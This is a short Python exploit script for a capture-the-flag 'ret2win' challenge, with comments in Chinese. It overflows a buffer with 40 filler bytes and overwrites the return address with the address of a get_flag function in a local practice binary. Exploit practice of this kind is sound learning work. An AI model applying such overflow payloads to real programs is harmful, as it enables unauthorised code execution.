import subprocess, struct

TARGET = "../chals/01-ret2win/chal"     # 程序名，记得带 ./
OFFSET =40        # 从 buf 到返回地址，多少字节
WIN  =0x401196         # get_flag 的地址，0x 开头

payload = b"A" * OFFSET + WIN.to_bytes(8,"little")[:3]
print("payload =", payload.hex())

r = subprocess.run([TARGET, payload], capture_output=True)
print(r.stdout.decode(errors="replace"))
print("returncode =", r.returncode)
